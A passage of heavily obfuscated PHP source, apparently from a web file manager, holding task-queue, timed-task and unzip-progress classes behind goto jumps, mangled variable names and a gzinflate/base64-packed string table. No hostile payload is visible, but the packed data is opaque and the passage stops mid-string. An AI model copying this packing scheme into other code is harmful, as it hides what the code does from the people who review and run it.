if ($¿’ı¼ÙÜ) { $ö˜ÅËéï = $this->parseKeyCheck($ö˜ÅËéï); } if ($ö˜ÅËéï != $²ĞğÉáå[189] && !preg_match($²ĞğÉáå[924], $ö˜ÅËéï)) { $ö˜ÅËéï = $²ĞğÉáå[385] . trim($ö˜ÅËéï, $²ĞğÉáå[385]) . $²ĞğÉáå[385]; } return $ö˜ÅËéï; } } goto bÍíÅñÜœ–; FÅÎ‡å‡¶ : class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\165\x65\x75\145\114\x65\156\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\145\x75\x65\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($üÃŠáßœ, $¶éÂ×‰Ñ = array(), $ˆÑ³é = '', $†ÕÊ‰« = '') { $¹Îê÷Åğ =& $_SERVER[şÒÁøÒÄ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($†ÕÊ‰« && array_find_by_field(self::$listData, $¹Îê÷Åğ[94], $†ÕÊ‰«)) { return !0; } self::$listData[] = array($¹Îê÷Åğ[264] => $üÃŠáßœ, $¹Îê÷Åğ[1778] => $¶éÂ×‰Ñ, $¹Îê÷Åğ[453] => $ˆÑ³é, $¹Îê÷Åğ[94] => $†ÕÊ‰«); return !0; } public static function addSubmit() { $úà½‘÷¶ =& $_SERVER[şÒÁøÒÄ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($úà½‘÷¶[1779] . json_encode_force(array_to_keyvalue(self::$listData, $úà½‘÷¶[12], $úà½‘÷¶[453])), $úà½‘÷¶[1780]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($£¨Œé¥¾, $œ’·„¾á = array(), $ÄÄÀãÇ® = '', $²°Äùôõ = '') { $¾œ½˜ş¥ =& $_SERVER[şÒÁøÒÄ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $°„é½» = self::getAll(); if ($²°Äùôõ && array_find_by_field($°„é½», $¾œ½˜ş¥[94], $²°Äùôõ)) { return !0; } $°„é½»[] = array($¾œ½˜ş¥[264] => $£¨Œé¥¾, $¾œ½˜ş¥[1778] => $œ’·„¾á, $¾œ½˜ş¥[453] => $ÄÄÀãÇ®, $¾œ½˜ş¥[94] => $²°Äùôõ); write_log($¾œ½˜ş¥[1779] . $ÄÄÀãÇ®, $¾œ½˜ş¥[1780]); self::setAll($°„é½»); return !0; } public static function run() { $Àá’áÎÄ =& $_SERVER[şÒÁøÒÄ]; $«”Şˆğ÷ = self::getAll(); $­ş¹ÒÌı = array_shift($«”Şˆğ÷); if (!$­ş¹ÒÌı) { return !1; } self::setAll($«”Şˆğ÷); $²£êºúØ = timeFloat(); try { Hook::apply($­ş¹ÒÌı[$Àá’áÎÄ[264]], $­ş¹ÒÌı[$Àá’áÎÄ[1778]]); } catch (Exception $Ã‚ƒ¸Š´) { } $™ºğü³ = number_format(timeFloat() - $²£êºúØ, 3) . $Àá’áÎÄ[1696]; write_log($Àá’áÎÄ[1781] . $­ş¹ÒÌı[$Àá’áÎÄ[453]] . $Àá’áÎÄ[1782] . $™ºğü³, $Àá’áÎÄ[1780]); return !0; } public static function count() { $Â¶Ç¶Îò = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Â¶Ç¶Îò) { return 0; } return intval($Â¶Ç¶Îò); } public static function getAll() { $Šı…ÍÛÏ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Šı…ÍÛÏ) { return array(); } return $Šı…ÍÛÏ; } public static function setAll($ßßËÁ­ï) { $ŸôíïÒ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ßßËÁ­ï), $ŸôíïÒ); Cache::set(self::QUEUE_DATA, $ßßËÁ­ï, $ŸôíïÒ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($®•ÏßæŠ, $¤õƒôï© = 5.0) { if (!$®•ÏßæŠ) { return; } $£†µæ”Š = Cache::get($®•ÏßæŠ); if (!$£†µæ”Š || timeFloat() - floatVal($£†µæ”Š) >= $¤õƒôï©) { Cache::set($®•ÏßæŠ, timeFloat(), $¤õƒôï© * 10); return !0; } return !1; } public static function timeLimitCall($ƒÓÅŸ¢æ, $¸Û¯÷øâ, $Ó‹‹ìŒà, $ÔÕË•’› = 5.0) { $Ş…ñãëÓ =& $_SERVER[şÒÁøÒÄ]; if (!$ƒÓÅŸ¢æ || !$¸Û¯÷øâ) { return; } self::$asyncAdd = !0; $æïÚŸÇ = $Ş…ñãëÓ[1783]; $‡öûÒû÷ = Cache::get($æïÚŸÇ, !0); $¦‘ñÓÀ = array($Ş…ñãëÓ[1784] => timeFloat(), $Ş…ñãëÓ[1785] => timeFloat(), $Ş…ñãëÓ[264] => $¸Û¯÷øâ, $Ş…ñãëÓ[1778] => $Ó‹‹ìŒà, $Ş…ñãëÓ[180] => $ÔÕË•’›); if (is_array($‡öûÒû÷[$ƒÓÅŸ¢æ])) { $¦‘ñÓÀ[$Ş…ñãëÓ[1785]] = $‡öûÒû÷[$ƒÓÅŸ¢æ][$Ş…ñãëÓ[1785]]; } if (is_array($‡öûÒû÷[$ƒÓÅŸ¢æ])) { if (timeFloat() - $‡öûÒû÷[$ƒÓÅŸ¢æ][$Ş…ñãëÓ[1784]] < $¦‘ñÓÀ[$Ş…ñãëÓ[180]] * 0.3) { return; } $¦‘ñÓÀ[$Ş…ñãëÓ[1785]] = $‡öûÒû÷[$ƒÓÅŸ¢æ][$Ş…ñãëÓ[1785]]; } $‡öûÒû÷[$ƒÓÅŸ¢æ] = $¦‘ñÓÀ; Cache::set($æïÚŸÇ, $‡öûÒû÷, 60); Cache::removeMemory($æïÚŸÇ); write_log($Ş…ñãëÓ[1786] . $ƒÓÅŸ¢æ . $Ş…ñãëÓ[71] . $¸Û¯÷øâ, $Ş…ñãëÓ[1780]); } public static function timeLimitCallLoop() { $„ü´®¤é =& $_SERVER[şÒÁøÒÄ]; $œÀ±˜ª = array($„ü´®¤é[1787]); $ˆÔíÚ”× = in_array(strtolower(ACTION), $œÀ±˜ª); if (!$ˆÔíÚ”× && !self::$asyncAdd) { return; } $Æôå¤ = $„ü´®¤é[1783]; $³õïí·ü = Cache::get($Æôå¤, !0); if (!$³õïí·ü || count($³õïí·ü) <= 0) { return; } $£ºŸêÑ¼ = !1; $·š·åØ³ = timeFloat(); $…ñĞ³­µ = array(); foreach ($³õïí·ü as $¹Íº«“Ì => $­­äì÷ú) { if ($·š·åØ³ - $­­äì÷ú[$„ü´®¤é[1785]] > $­­äì÷ú[$„ü´®¤é[180]]) { $£ºŸêÑ¼ = !0; try { Hook::apply($­­äì÷ú[$„ü´®¤é[264]], $­­äì÷ú[$„ü´®¤é[1778]]); write_log($„ü´®¤é[1788] . $¹Íº«“Ì . $„ü´®¤é[71] . $­­äì÷ú[$„ü´®¤é[264]] . $„ü´®¤é[1789] . ACTION, $„ü´®¤é[1780]); } catch (Exception $ü‘™‹Ÿ¢) { } continue; } $…ñĞ³­µ[$¹Íº«“Ì] = $­­äì÷ú; } if (!$£ºŸêÑ¼) { return; } if (!$…ñĞ³­µ) { return Cache::remove($Æôå¤); } Cache::set($Æôå¤, $…ñĞ³­µ, 60); Cache::removeMemory($Æôå¤); } public static function finished($åâå·º, $ó›¾ñà—) { $¸ºÙ°§ =& $_SERVER[şÒÁøÒÄ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¸ºÙ°§[264] => $åâå·º, $¸ºÙ°§[1778] => $ó›¾ñà—); } private static function finishedRun() { $Òî—§ =& $_SERVER[şÒÁøÒÄ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $§ˆºËßŞ) { try { Hook::apply($§ˆºËßŞ[$Òî—§[264]], $§ˆºËßŞ[$Òî—§[1778]]); } catch (Exception $ÛïÒöÏÊ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ĞÇÙÂà =& $_SERVER[şÒÁøÒÄ]; parent::startAfter(); Hook::bind($ĞÇÙÂà[1790], array($this, $ĞÇÙÂà[1791])); Hook::bind($ĞÇÙÂà[1206], array($this, $ĞÇÙÂà[1792])); $ôŸçãû =& $this->task; $ôŸçãû[$ĞÇÙÂà[1793]] = $ĞÇÙÂà[1207]; if (!$ôŸçãû[$ĞÇÙÂà[1580]]) { $ôŸçãû[$ĞÇÙÂà[1580]] = LNG($ĞÇÙÂà[1794]); } } protected function endAfter() { $„²™é—š =& $_SERVER[şÒÁøÒÄ]; parent::endAfter(); Hook::unbind($„²™é—š[1790], array($this, $„²™é—š[1791])); Hook::unbind($„²™é—š[1206], array($this, $„²™é—š[1792])); } public function updateAfter() { $š¢ãÆªä =& $_SERVER[şÒÁøÒÄ]; $¡ ÄâàÅ =& $this->task; if (!$¡ ÄâàÅ[$š¢ãÆªä[794]] || !$¡ ÄâàÅ[$š¢ãÆªä[771]]) { return; } if ($¡ ÄâàÅ[$š¢ãÆªä[1793]] == $š¢ãÆªä[1207]) { $ß¡İ†¼’ = 0; if ($¡ ÄâàÅ[$š¢ãÆªä[1733]]) { $ß¡İ†¼’ = $¡ ÄâàÅ[$š¢ãÆªä[1734]] / $¡ ÄâàÅ[$š¢ãÆªä[1733]]; } $¡ ÄâàÅ[$š¢ãÆªä[1682]] = $ß¡İ†¼’ * 0.3; } else { if ($¡ ÄâàÅ[$š¢ãÆªä[1793]] == $š¢ãÆªä[313]) { $ß¡İ†¼’ = $¡ ÄâàÅ[$š¢ãÆªä[1681]] / $¡ ÄâàÅ[$š¢ãÆªä[794]]; $¡ ÄâàÅ[$š¢ãÆªä[1682]] = 0.3 + $ß¡İ†¼’ * 0.4; } else { if ($¡ ÄâàÅ[$š¢ãÆªä[1793]] == $š¢ãÆªä[107]) { $üÙ¡§£ = 0; if ($¡ ÄâàÅ[$š¢ãÆªä[1735]] == $š¢ãÆªä[107]) { $üÙ¡§£ = $¡ ÄâàÅ[$š¢ãÆªä[1734]]; } $ß¡İ†¼’ = ($¡ ÄâàÅ[$š¢ãÆªä[1738]] + $üÙ¡§£) / $¡ ÄâàÅ[$š¢ãÆªä[771]]; $¡ ÄâàÅ[$š¢ãÆªä[1682]] = 0.3 + 0.4 + $ß¡İ†¼’ * 0.3; } } } if ($¡ ÄâàÅ[$š¢ãÆªä[1682]] > 0) { $…Ã³ÒÌª = timeFloat() - $¡ ÄâàÅ[$š¢ãÆªä[1684]] - $¡ ÄâàÅ[$š¢ãÆªä[1687]]; $¡ ÄâàÅ[$š¢ãÆªä[1688]] = $…Ã³ÒÌª * (1 - $¡ ÄâàÅ[$š¢ãÆªä[1682]]) / $¡ ÄâàÅ[$š¢ãÆªä[1682]]; } } public function addFile($¶²Î¿õš) { $ˆ¾›üù =& $_SERVER[şÒÁøÒÄ]; $¢’øü =& $this->task; $ô€ÈúªÚ = IO::info($¶²Î¿õš); $¢’øü[$ˆ¾›üù[1731]] = $ô€ÈúªÚ[$ˆ¾›üù[32]]; $¢’øü[$ˆ¾›üù[1733]] = $ô€ÈúªÚ[$ˆ¾›üù[76]]; $¢’øü[$ˆ¾›üù[1734]] = 0; $¢’øü[$ˆ¾›üù[1077]] = $ˆ¾›üù[1754]; $¢’øü[$ˆ¾›üù[1735]] = $ˆ¾›üù[1207]; $¢’øü[$ˆ¾›üù[771]] = $ô€ÈúªÚ[$ˆ¾›üù[76]]; $¢’øü[$ˆ¾›üù[794]] = 1; $é§­³ˆê = 0; $¢’øü[$ˆ¾›üù[1742]] = array($ˆ¾›üù[1743] => $é§­³ˆê + 1, $ˆ¾›üù[420] => $ô€ÈúªÚ[$ˆ¾›üù[32]], $ˆ¾›üù[84] => $ô€ÈúªÚ[$ˆ¾›üù[84]], $ˆ¾›üù[509] => $ô€ÈúªÚ[$ˆ¾›üù[509]] ? $ô€ÈúªÚ[$ˆ¾›üù[509]] : $ô€ÈúªÚ[$ˆ¾›üù[84]]); $this->update(); } public function unzipAfter($¥õ—üÛ•) { $íø¤Ğ“› =& $_SERVER[şÒÁøÒÄ]; $Àœ»ê½” =& $this->task; $Àœ»ê½”[$íø¤Ğ“›[1793]] = $íø¤Ğ“›[107]; $½“Üú½Î = IO::infoWithChildren($¥õ—üÛ•); $’âª½Ôä = 0; $Àœ»ê½”[$íø¤Ğ“›[1742]] = array($íø¤Ğ“›[1743] => $’âª½Ôä + 1, $íø¤Ğ“›[420] => $½“Üú½Î[$íø¤Ğ“›[32]], $íø¤Ğ“›[84] => $½“Üú½Î[$íø¤Ğ“›[84]], $íø¤Ğ“›[509] => $½“Üú½Î[$íø¤Ğ“›[509]] ? $½“Üú½Î[$íø¤Ğ“›[509]] : $½“Üú½Î[$íø¤Ğ“›[84]]); if ($½“Üú½Î[$íø¤Ğ“›[33]] == $íø¤Ğ“›[200]) { $Àœ»ê½”[$íø¤Ğ“›[794]] = 1; } else { $Àœ»ê½”[$íø¤Ğ“›[794]] = $½“Üú½Î[$íø¤Ğ“›[79]][$íø¤Ğ“›[77]]; } $Àœ»ê½”[$íø¤Ğ“›[1077]] = $íø¤Ğ“›[12]; $Àœ»ê½”[$íø¤Ğ“›[1735]] = 0; $Àœ»ê½”[$íø¤Ğ“›[1681]] = 0; $Àœ»ê½”[$íø¤Ğ“›[1733]] = 0; $Àœ»ê½”[$íø¤Ğ“›[1734]] = 0; $Àœ»ê½”[$íø¤Ğ“›[1731]] = $íø¤Ğ“›[12]; $Àœ»ê½”[$íø¤Ğ“›[1738]] = 0; $Àœ»ê½”[$íø¤Ğ“›[771]] = $½“Üú½Î[$íø¤Ğ“›[76]]; $this->update(); self::log($íø¤Ğ“›[1795] . json_encode(array($Àœ»ê½”, $½“Üú½Î))); } public function nameParse($š¡Æ’í) { $§ñØ€âë =& $_SERVER[şÒÁøÒÄ]; $Ê»¥úç =& $this->task; if ($Ê»¥úç[$§ñØ€âë[1793]] == $§ñØ€âë[1207]) { $Ê»¥úç[$§ñØ€âë[1793]] = $§ñØ€âë[313]; $Ê»¥úç[$§ñØ€âë[1738]] = 0; $Ê»¥úç[$§ñØ€âë[771]] = 0; } $Ğ•Ä¨…ú = get_path_this($š¡Æ’í); if (strstr($Ğ•Ä¨…ú, $§ñØ€âë[10])) { $Ê»¥úç[$§ñØ€âë[1681]] += 1; $Ê»¥úç[$§ñØ€âë[794]] += 1; } $Ê»¥úç[$§ñØ€âë[1731]] = $š¡Æ’í; $this->update(); } } goto b“²é‹Êğ†; CãÜ…ÉÙÒø: define($_SERVER[şÒÁøÒÄ][0], $_SERVER[şÒÁøÒÄ][1]); $_SERVER[ËğØş™½] = explode($_SERVER[şÒÁøÒÄ][2], gzinflate(substr($_SERVER[şÒÁøÒÄ][3], 10, -8))); function binCheckEq($¸Ì®ï¨Ñ, $‡¿ùÍ˜) { return $¸Ì®ï¨Ñ == $‡¿ùÍ˜; } goto EòÓ“Ú„˜À; c½¸¨Š‡íÀ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xfe\xd2\xc1\xf8\xd2\xc4", base64_decode('8vfi0KWb')); $_SERVER[şÒÁøÒÄ] = explode("\174\3\174\3\174\1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x7c\x24\x55\xb5\x30\xe\x88\xc8\xfa\x84\x7\x8\xf\x4\x8a\x40\x48\x32\xd3\x4b\x32\xfb\x64\x26\x33\x74\x92\xce\xa4\x99\x4e\x3a\x74\x77\x66\x21".base64_decode('CZXq7uruSrqrOlXVWWYBBgV0kH0Y2RFRZJFNthEY8CHqEwQUlU1UthlAUBAERVG/uw==')."\234\273\124\165\17\274\377\357\377\375\176\337\300\114\337\275\356\75\367\334\163\317\75\367\234\163\37\177\367\271\177\135\276\175\303\147\320\177\273\137\171\347\271\37\155\171\232\206\321".base64_decode('3z037EHDx5y7927kz8Hnbm5u7l2w7+z+/S+4+1btNu0mbXMi/vjPYgc8+d2Tojuvfw==')."\174\146\347\356\273\155\273\341\207\245\166\124\230\326\155\247\77\212\151\271\212\76\155\70\256\103\23\262\226\231\67\12\64\154\230\364\67\114\177\6\223\161\133\57\133\256\116\243\41"."\372\243\362\176\241\177\235\211\222\301\362\325\376\104\132\115\15\16\14\104\223\151\50\324\56\347\227\255\34\204\52\232\255\225\341\373\25\335\166\120\157\344\346\324\212\125\321\115\117"."\x8a\x48\xc8\x69\xae\x96\xd1\x1c\x68\xa9\xbb\x53\xed\x8e\xe\xc4\x13\x6b\xd5\xf4\xda\x81\x28\x94\xc8\xa8\x13\x55\xdd\x9e\xa1\x31\x12\x4c\xb9\x9a\xed\xa6\x8d\xb2\xce\x4b\x4c\xd9\xbc\x5f\x9d\xd1\x15".strrev('iFVjŞf®’¿ÔEôVFHÍ¬­tŒï"dôÚébúú%w&Ÿ¢Xé]"§ôŒ%~±')."\xce\xa8\xd2\x42\x3\x3d\x86\x5e\xca\xd1\xa0\xa9\xb1\xee\xb8\x33\x15\x8\xa5\x79\x8\x4d\x93\x59\x2d\x95\x68\xa4\x9f\x87\x72\x7a\x5e\xab\x96\x0\x5a\xdd\x72\xa4\x62\x1b\x65\x8d\xd\x7a\xa5\x3e\xc3"."\x53\x69\x40\xab\xba\x96\x61\x66\x69\x24\x3a\xed\xda\x9a\x48\x47\x7d\xcd\xa2\x89\xd6\x4d\x68\x2a\x15\x8d\x47\xbb\xd2\xa\xee\xa0\xd2\x93\x4c\xf4\x29\x30\x9\x65\xcd\x71\x75\x5b\x59\xdd\x1b\x4d\x46"."\x15\xdc\xe9\x8e\x26\x32\xd6\x26\x5\xf0\xa5\x1f\x81\x42\x89\xc4\xe3\xca\xae\x5a\x70\xf5\x72\x85\x35\x43\xeb\xd4\x69\x2c\x91\xec\x8e\x26\x95\xce\xb5\x8a\x80\x50\xd6\x2a\x97\x2d\x33\x84\x5a\x41\x33"."\351\112\135\215\46\223\64\20\0\364\216\307\360\244\101\44\321\323\223\212\362\30\14\356\344\70\352\311\134\300\117\117\54\227\57\271\352\244\126\252\62\64\35\247\277\115\360\3\277".base64_decode('lgOoO2GYRhXQFJqwLL6sIFBlpXWWoucgUEb1LVh5aBlO0mDHMvq7BAplVJyn266qmw==')._kodDe('KCFPjl1OpvmNX8inZCzR90bFEJtRARK8MQ4w1EDfHsvzUqg9ejupipnPqfDwiJoQKt0=')."\313\25\227\25\261\12\352\311\6\266\322\215\374\214\130\157\270\334\0\317\165\254\252\235\325\143\150\175\320\170\33\44\353\256\213\6\7\260\61\254\301\112\311\322\162\51\335\346\103".strrev('ĞÃ} Ÿè‰ĞÈ×üÚn “‘u³Œdë0ªÑ÷À2ˆİË²Ç¬RU‰Êê¢PÔ¬3')."\xa7\xa2\x5e\x2a\xa9\xfa\xb4\xe\xb\xa7\x9c\x9b\xef\x30\x60\x84\x9d\x8c\x61\x86\x51\xa\x8d\xc6\x12\x6a\x51\x73\x8a\x7d\xb9\xf9\x2a\xa9\x5\x5d\x36\x73\xfa\x74\xa8\x52\xac\xd0\xa8\x58\xd2\xc3\x1e"."\xc4\xc6\xa0\xeb\xb7\xdc\xa8\x44\x97\x4b\x56\x56\x2b\xc9\x43\xa4\xe1\xa2\xeb\x56\x52\xba\x99\xc3\x90\x80\xa1\x58\x53\x26\x81\x54\x45\xd7\xa1\x50\x77\x40\xc9\x29\x7d\xca\x5a\xa5\xb7\xdd\x68\x77\x58".strrev('-ºÚã İÕÖVÃ2Ã\\Õ‘’•*ÔòÄáB4'."\0".'Ğ¶Ød'."\r".'<¹6iİÃšxèØ‡‰rÅ')."\106\262\131\335\161\202\135\226\351\332\126\51\30\51\225\254\251\140\302\66\12\206\331\256\314\242\145\160\46\132\324\101\114\0\333\141\245\66\54\121\60\342\340\317\314\352\250\272\371".base64_decode('4CK2AnlpWzOdvG4Ho7Ay2hXUWU4FWbFuw6lYjoG7165orqtli5iCiOY7PqG8YZYMUw==').strrev('´«” 4qd®Ó@Z4jVAj•+µ¬¡ZØ]jĞÒú+*¾°î¶®)¯')."\165\104\212\14\264\335\1\220\143\371\140\37\136\127\206\236\13\246\20\305\206\344\271\255\363\24\204\72\12\313\243\251\275\351\364\200\32\353\101\133\162\177\124\355\213\244\273\172\241"."\333\256\126\140\175\216\43\72\314\233\144\211\153\202\150\175\141\344\352\107\143\25\211\3\326\224\156\243\17\167\316\264\53\343\126\56\143\115\207\130\26\56\234\102\204\206\25\306\323"."\135\161\203\111\315\54\140\370\144\146\134\35\120\320\231\54\170\1\35\327\315\202\133\144\25\123\321\344\252\150\122\115\45\172\322\253\43\111\330\314\115\204\45\323\354\123\270\351\122"."\x30\xa9\xe7\x10\xe8\xb3\x2e\xab\xa7\x55\x30\xd4\x58\x19\xbc\x38\xf0\x5c\xb1\x5c\xbc\x60\x58\x5e\x3c\xb6\x2\x3\xa6\x3b\xe8\xa0\x42\x41\xb9\x14\x6b\x3b\x6e\x94\xd\xdc\x77\x97\xe7\x10\x48\xa2\x9d"."\176\5\164\50\114\6\324\61\354\314\152\36\316\315\156\11\242\177\147\265\14\15\167\207\146\215\54\17\33\242\116\270\55\324\246\314\151\135\240\14\40\326\303\320\112\12\14\272\246"."\x44\xab\x92\x58\xe9\x5\x8b\xc0\x66\xd3\x32\xf5\x4f\x0\xe\xde\xbb\xa4\x65\xef\x3\x2b\x4d\x4c\x46\x4f\x1e\x8c\xa6\xd2\x6a\x5f\x34\xdd\x9b\xe8\x86\xaf\x47\x23\x10\x8a\x5b\x74\xd9\xb2\xd1\xe\xd1".base64_decode('nxGY3RH6oxpOj7St4CgnP6qVGUOT0aczGpunNDpW1goSkcepONZn2bo3ZQPfqlYbOQ==').base64_decode('vkegaK9uFIoALwO3lrVKlq2VMGVki0Jn1KpgALUCIiwiKaNcYZ11i9VyRgoCtXf5Tg==')."\xe5\x20\x4c\x62\xe1\xa2\xc5\x77\x36\xcb\x86\x50\x7b\x18\xaa\x34\xce\xe9\x81\x65\x99\x8\xa7\xe6\xa2\xff\x5\x91\xcf\x59\x65\x8d\x91\x4c\x42\xec\xf4\x1c\xa5\x76\x34\x69\x96\x27\xa7\x57\xd7\xc4\x76"."\xed\xda\xae\x85\x53\x6d\x4f\x11\x4\xda\xa2\x5\x53\x5c\xd0\x59\x97\xaa\xbc\x6f\xac\x97\x39\xbd\xa4\x33\xb8\x14\x75\xb6\x61\xb4\x42\x31\xb4\xe1\x71\xa8\xe5\xf9\xec\x21\xbe\xf\xa5\x8a\x9d\xda\x70"."\222\250\46\46\357\54\276\32\63\312\42\241\204\166\250\4\231\161\21\37\260\365\274\1\213\324\104\63\322\247\331\343\154\14\150\6\4\256\340\210\204\107\75\203\361\270\332\225\350".base64_decode('TyOWmqasTsbSUYa3kW410jWwgW28YkahACYwXsQX7PPkHJhZ1J2w2OYQxa5YpqMHsw==')."\120\103\260\336\65\131\71\261\13\320\22\322\316\341\333\14\246\203\132\171\135\260\214\226\100\220\167\324\273\7\53\260\73\320\255\74\6\163\43\210\73\6\43\72\25\261\315\177\40"."\x91\x82\xa\xcb\x71\x2a\x62\xc0\x32\xba\xd\x1f\x1b\x18\x84\xac\xb2\x84\x17\x2b\xa2\x90\xb8\x2f\xa0\x52\x51\x3\xb6\x2a\xb2\x3a\xc5\x8\x73\x15\x95\xb7\x8d\x75\x9a\x18\xd2\x72\xd6\x1f\x36\x90\x72"."\x49\xf0\x73\xde\x51\x5\x5\xe4\xd3\xbd\xb1\xfe\x95\x6a\x5f\xa2\x3b\x1a\x57\x63\xfd\x88\x32\xa5\x6b\xd3\x7\x7\xba\x23\x6c\x2a\xe5\xf4\xce\x44\xba\xd7\x93\x3a\x88\x68\xd3\xaa\x48\x3c\xe6\x2f\x1e"."\135\23\113\245\123\165\263\120\332\140\324\227\203\16\202\3\311\150\117\154\15\217\366\304\242\361\356\224\332\25\351\352\25\145\372\43\175\20\121\363\370\50\346\204\275\345\125\104\144"."\123\374\100\247\116\342\303\51\3\226\352\71\103\251\354\164\240\12\34\102\233\251\16\230\6\303\305\107\142\62\22\70\20\147\255\52\333\2\70\43\131\146\224\241\254\301\42\322\330"."\106\331\114\177\132\224\110\112\161\53\320\6\242\1\231\31\36\44\303\140\161\304\62\302\367\25\40\370\65\75\120\161\231\116\75\317\351\160\375\204\110\336\345\344\336\27\107\310\57"."\362\320\14\104\310\331\33\141\2\231\21\370\214\201\226\222\355\106\130\167\362\342\334\253\46\6\242\311\10\76\65\253\253\223\211\376\25\120\141\252\250\263\16\304\0\374\315\214\271"."\x82\xc3\xb3\x2b\xc8\x10\xe2\x8c\x34\x58\x2b\x65\x1\xf4\x31\x8b\x81\x72\x3\xfd\x39\x81\xfe\x20\xa6\x10\x3e\xae\x9b\xc\xea\x19\x4c\x91\xd9\xee\xc2\x2\x79\xb4\x1a\x18\x35\xb5\xaa\xfc\x6b\x19\xcb"."\202\57\224\60\177\260\201\21\14\176\370\36\163\30\222\114\63\122\63\33\76\70\15\273\102\72\261\62\332\257\62\314\242\61\11\33\151\2\72\316\46\222\0\20\327\32\147\147\62"."\232\231\214\246\330\52\267\365\211\252\301\300\25\16\315\6\54\326\321\306\3\237\17\237\72\74\65\273\171\50\70\73\64\202\2\55\263\116\244\121\210\15\207\74\321\343\241\176\325"."\xe6\xb5\x31\xdb\xd4\xec\x2c\x6f\x69\x1f\xe\xf\x87\x9b\x97\xb7\xf\x45\x82\xeb\xb4\xe0\xba\xd6\xe0\xe2\xe0\xc8\xec\xe1\x50\xcb\x6c\x48\x18\x59\x3f\x27\x30\x6f\x23\x2e\x80\xa\x2e\x3f\x6e\x4\xfd"."\164\14\57\157\34\16\236\160\332\350\211\103\303\43\115\355\263\217\35\16\35\67\74\65\62\253\145\71\373\116\266\152\243\363\146\166\206\167\65\67\273\31\165\11\261\123\274\210\111"."\x48\x9e\x54\x80\x65\xac\x33\x2a\x22\x75\xfd\x82\x8d\x2c\x1d\xcd\xa1\x5e\x10\x35\x86\x82\xc3\xb3\x47\x96\x4b\xf5\xa4\x24\xff\xb7\x10\xbb\x84\xe8\x6f\x91\x97\x8b\x4\x4f\xc1\x23\xe3\x55\xf1\xba\x7"."\xfc\xa8\x9a\x59\x41\x3d\xf1\xba\xc8\x68\x59\xa0\x3\x46\xc1\xe4\x4b\x8\xed\xe4\xfc\x9c\xee\xe5\xe2\xd7\x37\xd2\xdf\x8d\x6c\x22\xb\x3a\x2c\x7a\x22\x88\xb3\x1\x3b\xab\xa6\x31\xc1\xc4\x10\xa6\x3e"."\1\1\313\145\370\235\321\335\51\235\241\7\112\367\304\21\162\260\243\43\312\222\142\45\302\30\302\27\360\201\212\343\50\107\46\243\242\142\16\153\212\307\162\272\11\363\264\17\224"."\x76\xb2\x5a\x45\x4f\x49\x23\x54\xd5\x74\xa4\x33\x1e\x55\x19\x85\x1\x4a\xcc\xe2\x84\x2a\x76\x72\x91\x1d\x1a\x9a\xa0\xa8\x8c\x3e\x64\x5\xb\x4f\x4e\x2b\xb0\xf2\x9d\x89\x92\x42\x8\x83\xa2\xdb\xb6".strrev('£bC1O ¡Lz,]m§ÀOŒh¨	åSÔ9'."\n".'e•é[\\Ì†`­S¥é·e')."\167\23\156\36\36\256\16\351\271\221\41\204\370\132\60\77\262\176\356\306\26\306\345\207\207\321\37\26\211\324\221\243\251\234\32\252\150\177\16\341\176\160\121\212\47\302\263\151\324".base64_decode('sjmLVPEw0a7laiVPE2mcApPLN24QKtDZjguKhbdySQBJyGk/P8Rz2YgkAcM1Urob4g==')."\x25\x2\x52\xa6\x8a\xe2\x1e\x61\x70\x7\x8\x8\xf2\x86\x89\x96\x53\x97\xb4\xd5\x51\xd1\x4e\x6a\xc6\x71\xf5\xb2\x47\x6a\xe9\xe8\x9a\x9d\x2d\xf6\x54\x4b\x25\x97\xb3\xf2\x25\x63\x1c\xbe\x0\x6b\x5".strrev('HÑâ$Lé_¬J~ÌÒ´™Ø‚"»&ÄÕWçDÓ1‚½Va£tx‰Ù²ÇµW®Ì£úA¨„').base64_decode('v4L3c9iHELOQig5E0CaGz9apdBRkkLHuIGt3TTAGJyweMADsVgVTEBXBREUnmXE2lw==').strrev('&`0ÄlÕÀx<'."\0".';fp	úLp!îğ@Qãàc@§0–'."\0".'Í† ÈH(¬º ˆ').base64_decode('GYKx7oDhdJNjA/kAyWIdcotYDlLSZgK0c3F9Ui8FWNcCrMcBdjYMkANdN3RrEC0u6A==')."\26\11\42\32\132\14\140\164\302\330\34\20\42\300\200\65\145\352\66\51\2\140\22\47\216\200\70\215\4\12\266\125\255\14\260\157\112\61\332\55\110\20\175\346\11\111\313\162\3"."\xec\xac\x19\x90\x8f\xa1\xd0\x8b\x8\x5b\x35\x75\xc1\x59\x7f\x34\x4\xfe\xfe\x4e\xc0\xdc\xe1\xac\x5a\x28\x7d\xca\x64\xd5\xce\x87\xf7\xc8\xbd\x9e\xb6\x8\x67\xfa\x8d\x6c\xcf\xf3\x94\x11\xd3\xcb\x96".base64_decode('YUkXMTwBIrRKLGM8oB5tUsa8eljIdh6GxkL6J+S+ghP2nyv9EmH80bRWSEmfc7UC+w==')."\26\46\145\50\167\227\105\151\70\251\147\147\262\342\240\332\55\35\177\275\61\357\342\252\242\366\122\